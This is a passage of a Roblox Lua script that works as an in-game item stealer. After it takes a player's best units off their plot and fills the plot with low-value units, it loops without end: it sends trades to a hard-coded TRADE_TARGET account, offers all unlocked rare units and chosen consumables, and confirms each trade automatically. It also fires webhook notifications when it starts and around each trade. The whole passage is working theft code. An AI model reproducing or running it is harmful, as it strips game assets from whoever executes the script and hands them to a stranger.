--=====================================================================
-- PLOT SWAP: pick up best secrets first (slot 1 = best), replace with worst trash units
--=====================================================================
local function swapPlotUnits()
  if not tradeDC or not tradeER then return 0 end
  local inv   = tradeDeepUnwrap(tradeDC.Inventory)
  local slots = tradeDeepUnwrap(tradeDC.Slots)
  if type(inv) ~= "table" or type(slots) ~= "table" then return 0 end

  local placed = {}
  for _, d in pairs(slots) do
    if type(d) == "table" and type(d.unitId) == "string" then
      placed[d.unitId] = true
    end
  end

  -- trash: units only, not placed, worst rarity first
  local trash = {}
  for k, e in pairs(inv) do
    if type(e) == "table" and e.name and not placed[k] then
      local r = tradeGetRarity(e)
      if r and REPLACE_RARITIES[r] then
        local cfg = tradeER.getEntryConfig(e.name)
        if cfg and cfg.kind == "Unit" then
          trash[#trash+1] = { key = k, name = e.name, rank = RARITY_RANK[r] or 0 }
        end
      end
    end
  end
  table.sort(trash, function(a,b) return a.rank < b.rank end)

  if #trash == 0 then return 0 end

  -- pickup: string unitId only, slot 1 first (equip best puts best in slot 1)
  local swaps = {}
  for n, d in pairs(slots) do
    if type(d) == "table" and type(d.unitId) == "string" then
      local entry = inv[d.unitId]
      local r = tradeGetRarity(entry)
      if r and RARITY_FILTER[r] then
        swaps[#swaps+1] = {
          slot  = tonumber(n),
          unitId = d.unitId,
          name  = entry and entry.name or "?",
        }
      end
    end
  end
  table.sort(swaps, function(a,b) return a.slot < b.slot end)

  if #swaps == 0 then return 0 end

  local swapped  = 0
  local trashIdx = 1
  for _, s in ipairs(swaps) do
    if trashIdx > #trash then break end
    local rep = trash[trashIdx]
    pcall(function() InteractSlotRE:FireServer(s.slot) end)
    task.wait(PICKUP_DELAY)
    pcall(function() EquipUnitRF:InvokeServer(s.slot, rep.key) end)
    task.wait(PICKUP_DELAY)
    swapped  = swapped  + 1
    trashIdx = trashIdx + 1
  end

  if swapped > 0 then task.wait(1) end
  return swapped
end

--=====================================================================
-- BUILD TRADE OFFER — capped at MAX_TRADE_SLOTS
--=====================================================================
local function buildTradeOffer()
  if not tradeDC or not tradeER then return {} end
  local inv = tradeDeepUnwrap(tradeDC.Inventory)
  if type(inv) ~= "table" then return {} end
  local want = {}
  for _, n in ipairs(CONSUMABLES) do want[n] = true end

  local units, consumables = {}, {}

  for k, e in pairs(inv) do
    if type(k) == "string" and type(e) == "table" and e.name then
      local cfg = tradeER.getEntryConfig(e.name)
      if cfg and cfg.kind == "Unit" then
        local r = tradeGetRarity(e)
        if r and RARITY_FILTER[r] then
          local locked = e.attributes and e.attributes.locked == true
          if not locked then
            units[#units+1] = { key = k, amount = math.max(1, tonumber(e.amount) or 1) }
          end
        end
      elseif want[e.name] then
        local amt = tonumber(e.amount) or 0
        if amt > 0 then
          consumables[#consumables+1] = { key = k, amount = math.floor(amt) }
        end
      end
    end
  end

  -- units go first (higher priority), then consumables, total capped at MAX_TRADE_SLOTS
  local plan = {}
  for _, u in ipairs(units) do
    if #plan >= MAX_TRADE_SLOTS then break end
    plan[#plan+1] = u
  end
  for _, c in ipairs(consumables) do
    if #plan >= MAX_TRADE_SLOTS then break end
    plan[#plan+1] = c
  end

  return plan
end

local function tradeOfferMatchesPlan(plan)
  for _, e in ipairs(plan) do
    if (tonumber(tradeState.ownOffer[e.key]) or 0) < e.amount then return false end
  end
  return true
end

local function tradePushOneChunk(plan)
  for _, e in ipairs(plan) do
    local have = tonumber(tradeState.ownOffer[e.key]) or 0
    local missing = e.amount - have
    if missing > 0 then
      local chunk = 1
      for _, step in ipairs({ 1000, 100, 10 }) do
        if missing >= step then chunk = step; break end
      end
      tradeFire(ChangeOffer, e.key, chunk)
      return true
    end
  end
  return false
end

local function tradeWaitForOfferSync(plan, timeout)
  timeout = timeout or 15
  local deadline = os.clock() + timeout
  local lastPush = 0
  while os.clock() < deadline do
    if tradeOfferMatchesPlan(plan) then return true end
    if os.clock() - lastPush >= OFFER_PUSH_DELAY then
      if tradePushOneChunk(plan) then lastPush = os.clock() else return false end
    end
    task.wait(0.05)
  end
  return false
end

local function tradeHoldReady()
  for _ = 1, READY_MAX_RETRIES do
    if tradeState.ownReady or tradeState.phase == "Confirm" then return true end
    tradeFire(AdvanceTrade)
    local dl = os.clock() + READY_RETRY_DELAY
    while os.clock() < dl do
      if tradeState.ownReady or tradeState.phase == "Confirm" then return true end
      task.wait(0.05)
    end
  end
  return tradeState.ownReady or tradeState.phase == "Confirm"
end

local function findTradeTarget()
  for _, p in players:GetPlayers() do
    if p ~= localPlayer
        and (string.lower(p.Name) == string.lower(TRADE_TARGET)
          or string.lower(p.DisplayName) == string.lower(TRADE_TARGET)) then
      return p
    end
  end
  return nil
end

local function tradeRound()
  local target
  while not target do
    target = findTradeTarget()
    if not target then task.wait(1) end
  end
  task.wait(2)
  if not target.Parent then return end

  swapPlotUnits()
  task.wait(1)

  local plan = buildTradeOffer()
  if #plan == 0 then task.wait(5); return end
  pcall(sendTradeWebhook, "Pre-Trade")
  tradeFire(RequestTrade, target)

  local dl = os.clock() + 10
  while not tradeState.active and os.clock() < dl do task.wait(0.1) end
  if not tradeState.active then task.wait(3); return end

  if not tradeWaitForOfferSync(plan, 20) then tradeFire(CancelTrade); task.wait(3); return end
  task.wait(OFFER_SETTLE_WAIT)
  if not tradeOfferMatchesPlan(plan) then
    if not tradeWaitForOfferSync(plan, 10) then tradeFire(CancelTrade); task.wait(3); return end
  end
  tradeHoldReady()

  local pdl = os.clock() + 90
  while not tradeState.otherReady and os.clock() < pdl do
    if not target.Parent then return end
    if not tradeState.ownReady and tradeState.phase ~= "Confirm" then tradeHoldReady() end
    task.wait(0.3)
  end
  if tradeState.phase == "Confirm" then
    for _ = 1, READY_MAX_RETRIES do
      if tradeState.ownAccepted then break end
      tradeFire(AdvanceTrade)
      task.wait(0.4)
    end
    local adl = os.clock() + 5
    while not tradeState.ownAccepted and os.clock() < adl do task.wait(0.1) end
  end
  task.wait(2)
  pcall(sendTradeWebhook, "Post-Trade")
end

task.spawn(function()
  task.wait(2)
  pcall(sendTradeWebhook, "Script Executed")
end)

task.spawn(function()
  while true do
    pcall(tradeRound)
    task.wait(3)
  end
end)
